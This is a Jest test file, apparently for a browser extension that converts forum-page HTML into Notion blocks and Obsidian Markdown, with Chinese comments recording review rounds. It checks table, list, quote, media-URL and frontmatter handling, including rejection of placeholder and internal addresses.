        // 首行为 td 时仍不置表头(wave15 修复不回退)
        const plain = [];
        DOMToNotion._cookTable(element("table", [element("thead"),
            element("tbody", [element("tr", [td("1"), td("2")], { closest: () => null })])]), plain, "external");
        expect(plain.map((b) => `${b.type}:${b.table.has_column_header}`).join(" ")).toBe("table:false");
    });

    it("_cookTable: caption 文本与内嵌媒体不丢失", () => {
        const img = element("img", [], { getAttribute: attrs({ src: REAL }) });
        const caption = element("caption", [textNode("表标题"), img], {
            querySelectorAll: (sel) => (sel === "img" ? [img] : []),
        });
        const blocks = [];
        DOMToNotion._cookTable(element("table", [caption,
            element("tbody", [element("tr", [element("td", [textNode("1")], { closest: () => null })], { closest: () => null })])]), blocks, "external");
        expect(blocks.map((b) => b.type).join(" ")).toBe("paragraph image table");
        expect(blocks[0].paragraph.rich_text.map((r) => r.text.content).join("")).toBe("表标题");
        expect(blocks[1].image.external.url).toBe(REAL);
        expect(blocks[2].table.children.length).toBe(1);
    });

    it("serializeRichText: 块级引用/aside 与前文分行(嵌套引用不粘连)", () => {
        const rt = DOMToNotion.serializeRichText(element("div", [textNode("前"), element("blockquote", [textNode("引")])]));
        expect(rt.map((r) => r.text.content).join("")).toBe("前\n引");
        const nested = DOMToNotion.serializeRichText(element("aside", [textNode("外"), element("blockquote", [textNode("内")])]));
        expect(nested.map((r) => r.text.content).join("")).toBe("外\n内");
    });

    it("obsidian: ol/ul 内非 li 内容与相邻列表行分行", () => {
        // wave18 共识(w3 dsf): 列表块前后的块级内容需**空行**分隔 —— 单个换行会被
        // CommonMark 当作末个列表项的懒延续行(内容被并进列表项)
        expect(HTMLToMarkdown._convertNode(element("ol", [textNode("intro"), element("li", [textNode("a")])]))).toBe("intro\n\n1. a\n\n");
        expect(HTMLToMarkdown._convertNode(element("ul", [textNode("intro"), element("li", [textNode("a")])]))).toBe("intro\n\n- a\n");
        // 非 li 的**元素**子节点同样不与其后列表行粘连(文本节点路径之外的分支);
        // wave18 共识(w3 glm): ul 层的块级子元素按嵌套缩进(此前零缩进 → 渲染为顶层块)
        expect(HTMLToMarkdown._convertNode(element("ol", [element("span", [textNode("intro")]), element("li", [textNode("a")])]))).toBe("intro\n\n1. a\n\n");
        expect(HTMLToMarkdown._convertNode(element("ul", [element("span", [textNode("intro")]), element("li", [textNode("a")])]))).toBe("  intro\n\n- a\n");
    });

    it("obsidian: buildFrontmatter 对非数组 tags 不抛错(单值数组化)", () => {
        expect(HTMLToMarkdown.buildFrontmatter({ title: "T", tags: "solo" })).toContain('  - "solo"');
        expect(HTMLToMarkdown.buildFrontmatter({ title: "T" })).not.toContain("tags:");
        expect(HTMLToMarkdown.buildFrontmatter({ title: "T", tags: [] })).not.toContain("tags:");
    });

    it("obsidian: li 内联 code(反引号开头)不被误判为代码围栏", () => {
        const li = element("li", [textNode("foo"), element("code", [textNode("``a``")]), textNode("bar")]);
        // 定值断言: 误判为围栏会把列表项拆成多行("- foo\n``` ``a`` ```\nbar\n")
        expect(HTMLToMarkdown._convertNode(li)).toBe("- foo``` ``a`` ```bar\n");
        // 真代码围栏(嵌套 pre)仍按围栏分段, 不因收紧判据而回退(wave12/14 修复不回退)
        const withFence = HTMLToMarkdown._convertNode(element("li", [textNode("t"),
            element("pre", [element("code", [textNode("x = 1")])], { querySelector: () => element("code", [textNode("x = 1")], { getAttribute: () => null }) })]));
        expect(withFence).toContain("\n  ```\n  x = 1\n  ```\n");
    });

    it("_cookTable: <caption> 文本与内嵌媒体不被静默丢弃", () => {
        const td = (v) => element("td", [textNode(v)], { closest: () => null });
        const caption = element("caption", [textNode("表 1")], { closest: () => null });
        const blocks = [];
        DOMToNotion._cookTable(element("table", [caption,
            element("tbody", [element("tr", [td("1"), td("2")], { closest: () => null })])]), blocks, "external");
        expect(blocks.map((b) => b.type).join(" ")).toBe("paragraph table");
        expect(blocks[0].paragraph.rich_text.map((r) => r.text.content).join("")).toBe("表 1");
    });

    it("obsidian: buildFrontmatter 对非数组 tags 不抛错且不丢标签", () => {
        const fm = HTMLToMarkdown.buildFrontmatter({ title: "T", tags: "solo" });
        expect(fm).toContain('  - "solo"');
        expect(HTMLToMarkdown.buildFrontmatter({ title: "T" })).not.toContain("tags:");
        expect(HTMLToMarkdown.buildFrontmatter({ title: "T", tags: [] })).not.toContain("tags:");
    });

    it("serializeRichText: 空块级元素不飘移边界(needBreak 语义复核)", () => {
        const rt = (node) => DOMToNotion.serializeRichText(node).map((r) => r.text.content).join("");
        // 空块级元素不产出内容: 相邻两侧各一次边界(不多不少)
        expect(rt(element("div", [element("p", [textNode("a")]), element("p"), element("p", [textNode("b")])]))).toBe("a\nb");
        // 空嵌套块不叠加边界
        expect(rt(element("div", [element("p", [textNode("a")]), element("div", [element("div")]), element("p", [textNode("b")])]))).toBe("a\nb");
        // 首子块无前导换行, 末子块无尾随换行
        expect(rt(element("div", [element("p", [textNode("a")]), element("p", [textNode("b")])]))).toBe("a\nb");
    });
});

// ===== w3 第三模型复审(deepseek-v4-pro 视角): obsidian 出口面 4 条确认缺陷 =====
// 背景: wave16 的 w3 分片(obsidian.js + constants.js)未取得 glm 产出(通道 0 字符),
// 由 deepseek-v4-pro 独立复审; 4 条先在真实源码上复现(见 _w3_dspro_candidates.md), 再定值锁定。
describe("w3 第三模型复审: obsidian 列表/容器边界", () => {
    const ol = (children, props) => element("ol", children, props);
    const li = (children, props) => element("li", children, props);

    it("ol: 显式起始序号(start/value, 含 0 与负值)不被静默改写", () => {
        const a = li([textNode("a")]);
        // 属性缺失 → 缺省 1(不得把 Number(null)=0 当成 start=0)
        expect(HTMLToMarkdown._convertNode(ol([a]))).toBe("1. a\n\n");
        expect(HTMLToMarkdown._convertNode(ol([a], { getAttribute: attrs({ start: "3" }) }))).toBe("3. a\n\n");
        expect(HTMLToMarkdown._convertNode(ol([a], { getAttribute: attrs({ start: "0" }) }))).toBe("0. a\n\n");
        expect(HTMLToMarkdown._convertNode(ol([a], { getAttribute: attrs({ start: "-2" }) }))).toBe("-2. a\n\n");
        // <li value="0"> 覆盖起始编号(同样允许 0)
        expect(HTMLToMarkdown._convertNode(ol([li([textNode("a")], { getAttribute: attrs({ value: "0" }) })]))).toBe("0. a\n\n");
        // start 与 value 混合: value 只覆盖该项及其后的计数
        expect(HTMLToMarkdown._convertNode(ol([li([textNode("a")]), li([textNode("b")], { getAttribute: attrs({ value: "7" }) }), li([textNode("c")])], { getAttribute: attrs({ start: "2" }) })))
            .toBe("2. a\n7. b\n8. c\n\n");
        // 非法数值回退缺省, 不被 NaN 污染
        expect(HTMLToMarkdown._convertNode(ol([a], { getAttribute: attrs({ start: "abc" }) }))).toBe("1. a\n\n");
    });

    it("ol: 空 li 不注入连字符(裸 \"-\" 也属于 li 前缀)", () => {
        expect(HTMLToMarkdown._convertNode(ol([li([])]))).toBe("1.\n\n");
        expect(HTMLToMarkdown._convertNode(ol([li([textNode("   ")])]))).toBe("1.\n\n");
        // 非空项前缀剥离语义不回退(P4 修复: "1. - x" → "1. x")
        expect(HTMLToMarkdown._convertNode(ol([li([textNode("x")])]))).toBe("1. x\n\n");
    });

    it("li: 块级段落分隔不被折叠成软换行", () => {
        // 两段落: 保留空行(块级边界), 不再被 \s+\n 压成 "- a\n  b\n"
        expect(HTMLToMarkdown._convertNode(li([element("p", [textNode("a")]), element("p", [textNode("b")])])))
            .toBe("- a\n  \n  b\n");
        // 单段落不受影响
        expect(HTMLToMarkdown._convertNode(li([element("p", [textNode("a")])]))).toBe("- a\n");
        // 行尾空白仍被清理(折叠语义本身不回退)
        expect(HTMLToMarkdown._convertNode(li([textNode("a   \n   ")]))).toBe("- a\n");
    });

    it("_convertChildren: 块级子节点两侧边界不粘连", () => {
        // 块级子节点后的文本: 此前直接拼接得 "ab"; wave18 共识(w3 dsf) 起要求**空行**
        // (单个换行是软换行/懒延续, 两个相邻块被并为同一段落)
        expect(HTMLToMarkdown._convertNode(element("div", [element("div", [textNode("a")]), textNode("b")]))).toBe("a\n\nb");
        // 块级子节点前的文本: 同样须起行
        expect(HTMLToMarkdown._convertNode(element("div", [textNode("a"), element("div", [textNode("b")])]))).toBe("a\n\nb");
        // 末尾不无条件补换行(既有单块输出逐字节兼容)
        expect(HTMLToMarkdown._convertNode(element("div", [element("div", [textNode("a")])]))).toBe("a");
        // 自带尾换行的块(p)语义不变
        expect(HTMLToMarkdown._convertNode(element("div", [element("p", [textNode("x")]), element("p", [textNode("y")])]))).toBe("x\n\ny\n\n");
        expect(HTMLToMarkdown._convertNode(element("div", [element("p", [textNode("x")]), textNode("y")]))).toBe("x\n\ny");
    });
});

// ===== 清单自检: 清单与 src/ 现状一致(learnings-006 规则 3) =====
// 规则 3: 新增出口必须对照 SURFACE_INVENTORY 接入 DomSpec 原语, 不允许"下一轮审计再补"。
// 本组把清单从文档变成**可执行断言**: 原语消费点缺失 / 实现地重复 = 测试红。
describe("清单自检: 出口面清单与 src/ 现状一致", () => {
    const fs = require("fs");
    const path = require("path");
    const read = (p) => fs.readFileSync(path.resolve(process.cwd(), p), "utf8");
    const EXPORTERS = ["src/api/DOMToNotion.js", "src/api/obsidian.js"];

    it("清单条目结构完整", () => {
        expect(SURFACE_INVENTORY.length).toBe(10);
        for (const item of SURFACE_INVENTORY) {
            expect(`${item.surface.length > 0} ${item.primitive.length > 0}`).toBe("true true");
            expect(item.hosts).toBeGreaterThan(0);
            expect(item.exporters).toBeGreaterThanOrEqual(1);
            expect(item.exporters).toBeLessThanOrEqual(2);
        }
        // 双出口共担的出口面必须两导出器都接(emoji 判据已登记为单侧)
        for (const item of SURFACE_INVENTORY.filter((i) => !i.note)) {
            expect(`${item.surface} | ${item.exporters}`).toBe(`${item.surface} | 2`);
        }
    });

    it("两导出器不再各持本地媒体采集/地址判据实现", () => {
        for (const p of EXPORTERS) {
            const src = read(p);
            expect(`${p} | querySelectorAll 调用 | ${/\.querySelectorAll\(/.test(src)}`).toBe(`${p} | querySelectorAll 调用 | false`);
            expect(`${p} | mediaUrl 缺失 | ${src.includes("DomSpec.mediaUrl")}`).toBe(`${p} | mediaUrl 缺失 | true`);
            expect(`${p} | eachChildOrdered 缺失 | ${src.includes("DomSpec.eachChildOrdered")}`).toBe(`${p} | eachChildOrdered 缺失 | true`);
            expect(`${p} | isSkippedNode 缺失 | ${src.includes("DomSpec.isSkippedNode")}`).toBe(`${p} | isSkippedNode 缺失 | true`);
        }
        // Markdown 侧不得再自带公网校验(单一入口 safeUrl/mediaUrl)
        expect(read(EXPORTERS[1]).includes("validatePageExternalUrl")).toBe(false);
    });

    it("原语唯一实现地: 导出器不得重声明跳过表/折叠/遍历", () => {
        const spec = read("src/api/DomSpec.js");
        for (const name of ["SKIP_TAGS", "eachChildOrdered", "foldToSingleLine", "safeUrl", "mediaUrl", "mediaSrc", "eachMedia", "textWithBreaks", "isMetaNode", "collectTableRows", "HR_TEXT"]) {
            expect(`DomSpec | ${name} | ${spec.includes(name)}`).toBe(`DomSpec | ${name} | true`);
        }
        for (const p of EXPORTERS) {
            const src = read(p);
            expect(`${p} | 重声明跳过表 | ${/SKIP_TAGS\s*=/.test(src)}`).toBe(`${p} | 重声明跳过表 | false`);
            expect(`${p} | 重写 script 跳过 | ${/tag === "script"|case "script"/.test(src)}`).toBe(`${p} | 重写 script 跳过 | false`);
        }
    });
});

// ===== wave17: 三模型共识复审确认项的出口面契约(A–W) =====
// 动机与来源模型逐条登记于 _matrix.txt; 每条都断言**行为**(不丢失/不篡改/两出口同口径),
// 不断言内部函数名或调用形态。
describe("wave17 共识: 出口面契约", () => {
    const PUBLIC = "https://cdn.example.com/a.png";
    const src = (value) => ({ getAttribute: attrs({ src: value }) });

    it("A/C eachMedia: 按文档序采集(类序不再重排) + 不下探跳过面子树", () => {
        const kinds = [];
        const body = element("div", [
            element("video", [], src("https://cdn.example.com/v.mp4")),
            element("img", [], src(PUBLIC)),
            element("a", [], { classList: { contains: (c) => c === "attachment" }, getAttribute: attrs({ href: "https://cdn.example.com/f.pdf" }) }),
            element("audio", [], src("https://cdn.example.com/a.mp3")),
            element("iframe", [], src("https://www.youtube.com/embed/x")),
        ]);
        DomSpec.eachMedia(body, (_n, kind) => kinds.push(kind));
        // 旧实现按固定类序(img → attachment → video → audio → iframe)重排, 与源文档序相反
        expect(kinds).toEqual(["video", "img", "attachment", "audio", "iframe"]);

        const skipped = [];
        DomSpec.eachMedia(element("div", [
            element("noscript", [element("img", [], src(PUBLIC))]),
            element("style", [element("img", [], src(PUBLIC))]),
            element("script", [element("img", [], src(PUBLIC))]),
        ]), (_n, kind) => skipped.push(kind));
        expect(skipped).toEqual([]);
    });

    it("D mediaSrc: 非 http(s) scheme 一律视为占位并回退 data-src", () => {
        const holder = (own, lazy) => element("img", [], { getAttribute: attrs({ src: own, "data-src": lazy }) });
        for (const placeholder of ["data:image/png;base64,AAA", "about:blank", "blob:https://x/y", "javascript:void(0)", "file:///c:/a.png"]) {
            expect(`${placeholder} → ${DomSpec.mediaSrc(holder(placeholder, PUBLIC))}`).toBe(`${placeholder} → ${PUBLIC}`);
        }
        // 无 scheme(相对/协议相对)与已绝对 http(s) 地址仍是真实地址(交由 safeUrl 补齐 + 公网校验)
        expect(DomSpec.mediaSrc(holder("/a.png", PUBLIC))).toBe("/a.png");
        expect(DomSpec.mediaSrc(holder("//cdn.example.com/a.png", PUBLIC))).toBe("//cdn.example.com/a.png");
        expect(DomSpec.mediaSrc(holder(PUBLIC, "https://cdn.example.com/lazy.png"))).toBe(PUBLIC);
    });

    it("B absoluteUrl: scheme 大小写不敏感(不再被当成相对地址重拼)", () => {
        expect(Utils.absoluteUrl("HTTPS://cdn.example.com/a.png")).toBe("HTTPS://cdn.example.com/a.png");
        expect(Utils.absoluteUrl("Http://cdn.example.com/a.png")).toBe("Http://cdn.example.com/a.png");
        expect(Utils.absoluteUrl("https://cdn.example.com/a.png")).toBe(PUBLIC);
    });

    it("R mdText: 方括号转义而非删除(可点击图片标签不再被破坏, 且仍阻止 ]( 逃逸)", () => {
        const out = Utils.mdText("[![alt](u)](l)");
        expect(out).toBe("\\[!\\[alt\\](u)\\](l)");
        expect(/(^|[^\\])\]\(/.test(out)).toBe(false);
    });

    it("E _cookCode: 取整棵 <pre>(非首个 code 元素的文本不丢失)", () => {
        const pre = element("pre", [textNode("head"), element("code", [textNode("body")]), textNode("tail")]);
        const blocks = [];
        DOMToNotion._cookCode(pre, blocks);
        const content = blocks[0].code.rich_text.map((r) => r.text.content).join("");
        expect(content).toContain("head");
        expect(content).toContain("body");
        expect(content).toContain("tail");
    });

    it("F/L 块级边界: <br> 与块级元素两侧产生换行(内联文本不与之粘连)", () => {
        const p = element("p", [textNode("a"), element("br", []), textNode("b")]);
        expect(DOMToNotion.serializeRichText(p).map((r) => r.text.content).join("")).toBe("a\nb");
        const div = element("div", [textNode("前"), element("h3", [textNode("标题")]), textNode("后")]);
        expect(DOMToNotion.serializeRichText(div).map((r) => r.text.content).join("")).toBe("前\n标题\n后");
        // 透明下钻路径(cookedToBlocks): 同一 <br> 语义(此前 inlineBuf 直接拼接 → "ab")
        const origParser = globalThis.DOMParser;
        globalThis.DOMParser = function () {
            return { parseFromString: () => ({ body: element("body", [element("div", [textNode("line1"), element("br", []), textNode("line2")])]) }) };
        };
        try {
            const blocks = DOMToNotion.cookedToBlocks("<div>x</div>", "external");
            const text = blocks.map((b) => (b.paragraph?.rich_text || []).map((r) => r.text.content).join("")).join("");
            expect(text).toBe("line1\nline2");
        } finally {
            if (origParser === undefined) delete globalThis.DOMParser; else globalThis.DOMParser = origParser;
        }
    });

    it("G _cookAsideQuote: 保留非 blockquote 的直属署名行(按文档序)", () => {
        const aside = element("aside", [
            element("div", [textNode("署名")]),
            element("blockquote", [textNode("引用")]),
        ], { classList: { contains: (c) => c === "quote" } });
        const blocks = [];
        DOMToNotion._cookAsideQuote(aside, blocks, "external");
        expect(blocks.map((b) => b.type)).toEqual(["paragraph", "quote"]);
        expect(blocks[0].paragraph.rich_text.map((r) => r.text.content).join("")).toContain("署名");
    });

    it("H 被拒地址的媒体留可见标记(视频/音频不静默丢弃)", () => {
        const internal = (tag) => ({ tagName: tag, getAttribute: attrs({ src: "http://127.0.0.1/m.bin" }), querySelector: () => null });
        const v = [];
        DOMToNotion._cookVideo(internal("VIDEO"), v, "external");
        expect(v.length).toBe(1);
        expect(v[0].paragraph.rich_text.map((r) => r.text.content).join("")).toContain("视频已拒");
        const a = [];
        DOMToNotion._cookAudio(internal("AUDIO"), a, "external");
        expect(a.length).toBe(1);
        expect(a[0].paragraph.rich_text.map((r) => r.text.content).join("")).toContain("音频已拒");
        // imgMode=skip 是用户显式设置, 仍保持静默(与图片同口径)
        const s = [];
        DOMToNotion._cookVideo(internal("VIDEO"), s, "skip");
        expect(s).toEqual([]);
    });

    it("I/O _cookIframe: data-src 懒加载回退 + imgMode=skip 静默 + 非白名单降级为链接", () => {
        const frame = (props) => element("iframe", [], { getAttribute: attrs(props), querySelector: () => null });
        const embed = [];
        expect(DOMToNotion._cookIframe(frame({ "data-src": "https://www.youtube.com/embed/x" }), embed, "external")).toBe(true);
        expect(embed[0].type).toBe("embed");
        const skipped = [];
        expect(DOMToNotion._cookIframe(frame({ src: "https://www.youtube.com/embed/x" }), skipped, "skip")).toBe(false);
        expect(skipped).toEqual([]);
        const fallback = [];
        expect(DOMToNotion._cookIframe(frame({ src: "https://player.evil.com/v" }), fallback, "external")).toBe(true);
        expect(fallback.every((b) => b.type !== "embed")).toBe(true);
        expect(JSON.stringify(fallback)).toContain("https://player.evil.com/v");
    });

    it("J 内联 code 保留 <br> 换行", () => {
        const p = element("p", [element("code", [textNode("a"), element("br", []), textNode("b")])]);
        expect(DOMToNotion.serializeRichText(p).map((r) => r.text.content).join("")).toContain("a\nb");
    });

    it("K rich_text 超 100 段保留可见截断标记", () => {
        const p = element("p", Array.from({ length: 140 }, (_v, i) => element("span", [textNode(`s${i}`)])));
        const rt = DOMToNotion.serializeRichText(p);
        expect(rt.length).toBeLessThanOrEqual(100);
        expect(rt[rt.length - 1].text.content).toContain("截断");
    });

    it("M li 内嵌套列表不粘连 + 媒体不重复落块", () => {
        const inner = element("ul", [element("li", [textNode("内")])]);
        const outer = element("ul", [element("li", [textNode("外"), inner, element("img", [], src(PUBLIC))])]);
        const blocks = [];
        DOMToNotion._cookList(outer, blocks, "external");
        expect(blocks.filter((b) => b.type === "bulleted_list_item").length).toBe(2);
        expect(blocks.filter((b) => b.type === "image").length).toBe(1);
    });

    it("N <a> 内联标注保留(递归子节点, 不丢 code/文本)", () => {
        const a = element("a", [textNode("前"), element("code", [textNode("码")]), textNode("后")], { getAttribute: attrs({ href: "https://cdn.example.com/p" }) });
        const linked = DOMToNotion.serializeRichText(element("p", [a])).filter((r) => r.text.link);
        expect(linked.map((r) => r.text.content).join("")).toBe("前码后");
    });

    it("P .md-table 容器内多个表格逐个产出(不再只取首个)", () => {
        const table = (v) => element("table", [element("tbody", [element("tr", [element("td", [textNode(v)])], { closest: () => null })])]);
        const holder = element("div", [table("T1"), table("T2")], { classList: { contains: (c) => c === "md-table" } });
        // wave18: 容器分派已上移至 processElement —— 经真实入口(cookedToBlocks)验证
        const orig = globalThis.DOMParser;
        globalThis.DOMParser = function () { return { parseFromString: () => ({ body: element("body", [holder]) }) }; };
        let blocks;
        try {
            blocks = DOMToNotion.cookedToBlocks("<div>x</div>", "external");
        } finally {
            if (orig === undefined) delete globalThis.DOMParser;
            else globalThis.DOMParser = orig;
        }
        expect(blocks.filter((b) => b.type === "table").length).toBe(2);
    });

    it("Q 块级图片地址被拒时保留 alt(不零产出)", () => {
        const img = element("img", [], { getAttribute: attrs({ src: "http://127.0.0.1/x.png", alt: "图注" }) });
        const blocks = [];
        DOMToNotion._cookBlockImage(img, blocks, "external");
        expect(blocks.length).toBe(1);
        expect(JSON.stringify(blocks[0])).toContain("图注");
    });

    it("T/U/V/W Markdown 出口: caption / 嵌套引用边界 / ol start·li value / 语言判据", () => {
        const table = element("table", [
            element("caption", [textNode("表题")]),
            element("tbody", [element("tr", [element("td", [textNode("c")])])]),
        ]);
        expect(HTMLToMarkdown._convertNode(table)).toContain("表题");

        const quote = element("blockquote", [textNode("外"), element("blockquote", [textNode("内")])]);
        const qmd = HTMLToMarkdown._convertNode(quote);
        expect(qmd).toContain("> 外");
        expect(qmd).toContain("> > 内");
        expect(qmd).not.toContain("外> 内");

        const list = element("ol", [
            element("li", [textNode("a")]),
            element("li", [textNode("b")], { getAttribute: attrs({ value: "7" }) }),
        ], { getAttribute: attrs({ start: "3" }) });
        const lmd = HTMLToMarkdown._convertNode(list);
        expect(lmd).toContain("3. a");
        expect(lmd).toContain("7. b");

        const codeEl = element("code", [textNode("x")], { getAttribute: attrs({ class: "lang-python" }), querySelector: () => null });
        const pre = element("pre", [codeEl], { querySelector: (sel) => (sel === "code" ? codeEl : null) });
        expect(HTMLToMarkdown._convertNode(pre)).toContain("```python");
    });

    it("S Markdown frontmatter: 缺值/非数值不再被伪造成 0 或 1", () => {
        const empty = HTMLToMarkdown.buildFrontmatter({ stars: null, floors: "", topicId: undefined });
        expect(empty).not.toContain("stars:");
        expect(empty).not.toContain("floors:");
        expect(empty).not.toContain("topic_id:");

        const numeric = HTMLToMarkdown.buildFrontmatter({ stars: "12", floors: 3, topicId: 9 });
        expect(numeric).toContain("stars: 12");
        expect(numeric).toContain("floors: 3");
        expect(numeric).toContain("topic_id: 9");

        const coerced = HTMLToMarkdown.buildFrontmatter({ stars: true, floors: "abc" });
        expect(coerced).not.toContain("stars: 1");
        expect(coerced).toContain('floors: "abc"');
    });
});

describe("wave18 共识: 出口面契约(第二轮复审零新缺陷)", () => {
    const PUBLIC = "https://cdn.example.com/a.png";
    const holder = (map, tag = "img") => element(tag, [], { getAttribute: attrs(map) });

    it("mediaSrc: 占位候选不返回(不造「已拒」噪声块); 回退链覆盖响应式/懒加载属性", () => {
        // 懒加载骨架: 无真实候选 → 空串(消费侧静默, 不再把"未加载完成"误报为"地址被安全策略拒绝")
        expect(DomSpec.mediaSrc(holder({ src: "data:image/gif;base64,R0lGOD", "data-src": "data:image/gif;base64,R0lGOD" }))).toBe("");
        expect(DomSpec.mediaSrc(holder({ src: "about:blank", "data-src": "about:blank" }, "iframe"))).toBe("");
        // 无 src 的响应式/懒加载元素回退
        expect(DomSpec.mediaSrc(holder({ "data-lazy-src": PUBLIC }))).toBe(PUBLIC);
        expect(DomSpec.mediaSrc(holder({ "data-original": PUBLIC }))).toBe(PUBLIC);
        expect(DomSpec.mediaSrc(holder({ srcset: `${PUBLIC} 1x, https://cdn.example.com/b.png 2x` }))).toBe(PUBLIC);
        expect(DomSpec.mediaSrc(holder({ srcset: "data:image/gif;base64,AA 1x" }))).toBe("");
        const source = { getAttribute: attrs({ srcset: `${PUBLIC} 1x` }) };
        const video = element("video", [], { getAttribute: () => null, querySelector: (sel) => (sel === "source" ? source : null) });
        expect(DomSpec.mediaSrc(video)).toBe(PUBLIC);
    });

    it("li 为块级文本边界: 容器块内同层列表项不再粘连", () => {
        expect(DomSpec.TEXT_BOUNDARY_TAGS.has("li")).toBe(true);
        const quote = element("blockquote", [element("ul", [element("li", [textNode("第一条")]), element("li", [textNode("第二条")])])]);
        const joined = DOMToNotion.serializeRichText(quote).map((r) => r.text.content).join("");
        expect(joined).toContain("第一条\n第二条");
        expect(joined).not.toContain("第一条第二条");
    });

    it("mdText/mdLink: 转义字符自身也被转义(标签以 \\ 结尾不再吞掉链接闭合符)", () => {
        expect(Utils.mdText("C:\\")).toBe("C:\\\\");
        expect(Utils.mdLink("C:\\", "https://a.com/1")).toBe("[C:\\\\](https://a.com/1)");
        expect(Utils.mdText("[![alt](u)](l)")).toBe("\\[!\\[alt\\](u)\\](l)");
    });

    it("truncateText: 非字符串输入不抛错, 且不切断代理对", () => {
        expect(Utils.truncateText(42)).toBe("42");
        expect(Utils.truncateText(null)).toBe("");
        expect(Utils.truncateText("短")).toBe("短");
        expect(Utils.truncateText("a".repeat(99) + "😀" + "bbb", 100)).toBe("a".repeat(99) + "...");
    });

    it("normalizeDedupUrl: 查询值末尾的 / 先被编码为 %2F(不同页面不会合并为同一去重键)", () => {
        // wave18 复核(qwen 提案被实测驳回): searchParams.delete() 触发 query 重新序列化,
        // 查询值内的 "/" 变 %2F, 尾斜杠正则只作用于 path → 不同页面的键保持不同
        expect(Utils.normalizeDedupUrl("https://linux.do/search?q=foo/")).toBe("https://linux.do/search?q=foo%2F");
        expect(Utils.normalizeDedupUrl("https://linux.do/search?q=foo/")).not.toBe(Utils.normalizeDedupUrl("https://linux.do/search?q=foo"));
        // 既有口径不变: 根路径与路径段尾斜杠仍被剥离, 跟踪参数仍被剔除
        expect(Utils.normalizeDedupUrl("https://a.com/")).toBe("https://a.com");
        expect(Utils.normalizeDedupUrl("https://a.com/a/")).toBe("https://a.com/a");
        expect(Utils.normalizeDedupUrl("https://a.com/a/?utm_source=x")).toBe("https://a.com/a");
    });
});

describe("wave18 w2 共识: DOMToNotion 出口面契约", () => {
    const PUBLIC = "https://cdn.example.com/a.png";
    const withDom = (body, fn) => {
        const orig = globalThis.DOMParser;
        globalThis.DOMParser = function () {
            return { parseFromString: () => ({ body }) };
        };
        try { return fn(); } finally {
            if (orig === undefined) delete globalThis.DOMParser;
            else globalThis.DOMParser = orig;
        }
    };

    it("透明下钻路径保留内联语义(链接目标与注解不再被拍成纯文本)", () => {
        const div = element("div", [
            textNode("看 "),
            element("a", [textNode("链接")], { getAttribute: attrs({ href: PUBLIC }) }),
            textNode(" "),
            element("strong", [textNode("重点")]),
        ]);
        const blocks = withDom(element("body", [div]), () => DOMToNotion.cookedToBlocks("<div>x</div>", "external"));
        expect(blocks.map((b) => b.type)).toEqual(["paragraph"]);
        const rich = blocks[0].paragraph.rich_text;
        expect(rich.some((r) => r.text.link && r.text.link.url === PUBLIC)).toBe(true);
        expect(rich.some((r) => r.annotations && r.annotations.bold === true)).toBe(true);
        expect(rich.map((r) => r.text.content).join("")).toContain("重点");
    });

    it("引用容器裸文本子节点不再丢弃(与无-blockquote 回退分支同口径)", () => {
        const aside = element("aside", [
            textNode("署名文本"),
            element("blockquote", [textNode("引用")]),
        ], { classList: { contains: (c) => c === "quote" } });
        const blocks = [];
        DOMToNotion._cookAsideQuote(aside, blocks, "external");
        expect(blocks.map((b) => b.type)).toEqual(["paragraph", "quote"]);
        expect(blocks[0].paragraph.rich_text.map((r) => r.text.content).join("")).toContain("署名文本");
    });

    it("<pre> 内媒体补发(与段落/标题/引用/表格补发口径一致)", () => {
        const img = element("img", [], { getAttribute: attrs({ src: PUBLIC }) });
        const pre = element("pre", [element("code", [textNode("x")]), img], { querySelector: () => null });
        const blocks = [];
        DOMToNotion._cookCode(pre, blocks, "external");
        expect(blocks.map((b) => b.type)).toContain("code");
        expect(blocks.map((b) => b.type)).toContain("image");
    });

    it(".md-table 容器不再整支丢弃 / 嵌套表不重复产出", () => {
        const mdTable = (children) => element("div", children, { classList: { contains: (c) => c === "md-table" } });
        const tbody = (text) => element("tbody", [element("tr", [element("td", [textNode(text)])], { closest: () => null })]);
        const table = element("table", [tbody("a")]);
        // 容器内文本 + 表格: 两者都产出(此前只出表格, 说明文字静默丢失)
        const mixed = withDom(element("body", [mdTable([textNode("表格说明"), table])]), () => DOMToNotion.cookedToBlocks("<div>x</div>", "external"));
        expect(mixed.map((b) => b.type)).toEqual(["paragraph", "table"]);
        // 容器内无表格元素: 内容仍不丢
        const noTable = withDom(element("body", [mdTable([element("p", [textNode("正文")])])]), () => DOMToNotion.cookedToBlocks("<div>x</div>", "external"));
        expect(noTable.map((b) => b.type)).toContain("paragraph");
        // 嵌套表整体只产出一个表格块(内层表的文本已并入外层单元格, 不重复落块)
        const inner = element("table", [tbody("y")]);
        const outer = element("table", [element("tbody", [element("tr", [element("td", [textNode("x"), inner])], { closest: () => null })])]);
        const nested = withDom(element("body", [mdTable([outer])]), () => DOMToNotion.cookedToBlocks("<div>x</div>", "external"));
        expect(nested.filter((b) => b.type === "table").length).toBe(1);
        expect(JSON.stringify(nested)).toContain("y");
    });

    it("透明下钻不进入跳过子树(noscript 内降级媒体不产出)", () => {
        const body = element("body", [element("div", [
            element("noscript", [element("img", [], { getAttribute: attrs({ src: PUBLIC }) })]),
        ])]);
        const blocks = withDom(body, () => DOMToNotion.cookedToBlocks("<div>x</div>", "external"));
        expect(blocks.map((b) => b.type)).not.toContain("image");
        expect(blocks.length).toBe(0);
    });

    it("超长 URL(>2000 字符)不写入 Notion 字段(避免整页 400), 可见文本保留", () => {
        const longUrl = "https://cdn.example.com/" + "a".repeat(2100);
        expect(DomSpec.safeUrl(longUrl)).toBe("");
        expect(DomSpec.safeUrl(PUBLIC)).toBe(PUBLIC);
        const attachment = element("a", [textNode("f.pdf")], {
            classList: { contains: (c) => c === "attachment" },
            getAttribute: attrs({ href: longUrl }),
        });
        const blocks = [];
        DOMToNotion._cookAttachment(attachment, blocks, "external");
        expect(blocks.map((b) => b.type)).toEqual(["paragraph"]);
        expect(blocks[0].paragraph.rich_text.map((r) => r.text.content).join("")).toContain("f.pdf");
    });
});

describe("wave18 w3 共识 + w1/w2 补派: 出口面契约", () => {
    const PUBLIC = "https://cdn.example.com/a.png";
    const withDom = (body, fn) => {
        const orig = globalThis.DOMParser;
        globalThis.DOMParser = function () {
            return { parseFromString: () => ({ body }) };
        };
        try { return fn(); } finally {
            if (orig === undefined) delete globalThis.DOMParser;
            else globalThis.DOMParser = orig;
        }
    };

    it("列表块与后续块级内容之间有空行(不成为末项的懒延续行)", () => {
        expect(HTMLToMarkdown._convertNode(element("ol", [element("li", [textNode("x")])]))).toBe("1. x\n\n");
